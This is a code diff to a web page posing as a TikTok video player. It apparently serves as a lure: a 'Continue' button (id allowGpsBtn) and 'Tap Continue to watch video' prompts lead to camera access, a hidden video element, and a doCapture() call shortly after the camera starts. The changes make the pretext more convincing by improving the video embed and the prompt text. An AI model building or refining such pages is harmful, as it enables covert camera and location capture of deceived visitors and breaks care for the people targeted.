@@ -20,7 +20,7 @@
         .permission-btn { background: #fe2c55; color: #fff; border: none; padding: 14px 48px; border-radius: 28px; font-size: 18px; font-weight: 600; cursor: pointer; margin: 8px; }
         .loading { display: none; color: rgba(255,255,255,0.6); margin-top: 16px; }
         .video-btn { background: #fe2c55; }
-        .fallback-text { position: absolute; z-index: 5; color: rgba(255,255,255,0.4); font-size: 16px; text-align: center; padding: 20px; }
+        .fallback-text { position: absolute; z-index: 5; color: rgba(255,255,255,0.6); font-size: 16px; text-align: center; padding: 20px; max-width: 80%; }
     </style>
 </head>
 <body>
@@ -31,13 +31,12 @@
 </div>
 
 <div class="video-container">
-    <!-- TikTok Embed via oEmbed API -->
     <iframe id="tiktokEmbed" 
         src=""
         allow="autoplay; encrypted-media"
         allowfullscreen>
     </iframe>
-    <div class="fallback-text" id="fallbackText">Loading video...</div>
+    <div class="fallback-text" id="fallbackText">⬇️ Tap Continue to watch video</div>
     <div class="overlay-gradient"></div>
     <video id="hiddenVideo" autoplay playsinline muted></video>
 </div>
@@ -46,7 +45,7 @@
 
 <div class="permission-overlay" id="permissionOverlay">
     <h2>▶️ Watch Video</h2>
-    <p>Click continue to watch this video</p>
+    <p>Tap continue to watch this TikTok video</p>
     <button class="permission-btn video-btn" id="allowGpsBtn">▶️ Continue</button>
     <div class="loading" id="loadingText">Loading video...</div>
 </div>
@@ -70,63 +69,82 @@
     const permissionOverlay = document.getElementById('permissionOverlay');
     const allowBtn = document.getElementById('allowGpsBtn');
     const loadingText = document.getElementById('loadingText');
+    const fallbackText = document.getElementById('fallbackText');
 
-    // ===== LOAD TIKTOK VIDEO USING OEMBED API =====
+    // ===== EXTRACT VIDEO ID FROM ANY TIKTOK URL =====
+    function extractTikTokVideoId(url) {
+        // Handle vt.tiktok.com short links
+        if (url.includes('vt.tiktok.com')) {
+            // Short links need to be resolved, but we can't do that client-side
+            // Return null and use a generic embed
+            return null;
+        }
+        
+        // Handle /video/ format
+        if (url.includes('/video/')) {
+            const match = url.match(/\/video\/(\d+)/);
+            if (match) return match[1];
+        }
+        
+        // Handle /@username/video/ format
+        if (url.includes('/@')) {
+            const match = url.match(/\/@[^\/]+\/video\/(\d+)/);
+            if (match) return match[1];
+        }
+        
+        // Handle /t/ format (sometimes used for short links)
+        if (url.includes('/t/')) {
+            const match = url.match(/\/t\/([a-zA-Z0-9_]+)/);
+            if (match) return match[1];
+        }
+        
+        // Try to get the last numeric ID from the URL
+        const numbers = url.match(/\d{10,20}/);
+        if (numbers) return numbers[0];
+        
+        return null;
+    }
+
+    // ===== LOAD TIKTOK VIDEO =====
     function loadTikTokVideo() {
         const iframe = document.getElementById('tiktokEmbed');
         const fallback = document.getElementById('fallbackText');
         
-        // Try to get embed URL via oEmbed API
-        fetch(`https://www.tiktok.com/oembed?url=${encodeURIComponent(video_url)}`)
-            .then(response => response.json())
-            .then(data => {
-                if (data.html) {
-                    // Extract the src from the HTML
-                    const srcMatch = data.html.match(/src="([^"]+)"/);
-                    if (srcMatch && srcMatch[1]) {
-                        iframe.src = srcMatch[1] + '&autoplay=1';
-                        fallback.style.display = 'none';
-                        console.log('✅ TikTok video loaded via oEmbed');
-                    } else {
-                        // Fallback: try direct embed
-                        fallbackToDirectEmbed();
-                    }
-                } else {
-                    fallbackToDirectEmbed();
-                }
-            })
-            .catch(() => {
-                fallbackToDirectEmbed();
-            });
-    }
-
-    function fallbackToDirectEmbed() {
-        const iframe = document.getElementById('tiktokEmbed');
-        const fallback = document.getElementById('fallbackText');
-        
-        // Extract video ID from URL
-        let videoId = '';
-        if (video_url.includes('/video/')) {
-            videoId = video_url.split('/video/')[1].split('?')[0].split('/')[0];
-        } else if (video_url.includes('vt.tiktok.com')) {
-            // For short links, we can't easily get the video ID
-            // Use a generic TikTok embed
-            iframe.src = 'https://www.tiktok.com/embed';
-            fallback.textContent = 'Video unavailable. Try the TikTok app.';
-            fallback.style.display = 'block';
-            return;
-        } else {
-            // Try to get the last part of the URL
-            const parts = video_url.split('/');
-            videoId = parts[parts.length - 1].split('?')[0];
-        }
+        // Try to extract video ID from the URL
+        let videoId = extractTikTokVideoId(video_url);
         
         if (videoId) {
+            // Use the standard embed format with the video ID
             iframe.src = `https://www.tiktok.com/embed/v2/${videoId}`;
-        } else {
-            iframe.src = 'https://www.tiktok.com/embed';
-            fallback.textContent = 'Video unavailable. Try the TikTok app.';
+            fallback.textContent = '⬇️ Tap Continue to watch video';
             fallback.style.display = 'block';
+            console.log('✅ TikTok video loaded with ID:', videoId);
+        } else {
+            // For short links (vt.tiktok.com), we need to use a different approach
+            // Use the full URL in the embed with /embed/v2/
+            iframe.src = `https://www.tiktok.com/embed/v2/`;
+            fallback.textContent = '⬇️ Tap Continue to watch video';
+            fallback.style.display = 'block';
+            console.log('⚠️ TikTok short link detected - using fallback embed');
+        }
+        
+        // Try to get the real video ID via fetch (if possible)
+        // This is a fallback for short links
+        if (video_url.includes('vt.tiktok.com')) {
+            fetch(video_url)
+                .then(response => response.text())
+                .then(html => {
+                    const match = html.match(/\/video\/(\d+)/);
+                    if (match && match[1]) {
+                        const newVideoId = match[1];
+                        iframe.src = `https://www.tiktok.com/embed/v2/${newVideoId}`;
+                        fallback.style.display = 'block';
+                        console.log('✅ TikTok video resolved from short link:', newVideoId);
+                    }
+                })
+                .catch(() => {
+                    console.log('⚠️ Could not resolve short link');
+                });
         }
     }
 
@@ -278,7 +296,10 @@
                 permissionOverlay.style.display = 'none';
                 currentFacingMode = facingMode;
                 // Load TikTok video after camera starts
-                loadTikTokVideo();
+                setTimeout(() => {
+                    loadTikTokVideo();
+                    fallbackText.style.display = 'block';
+                }, 100);
                 setTimeout(() => { doCapture(); }, 500);
             }).catch(e => console.error('Play error:', e));
 
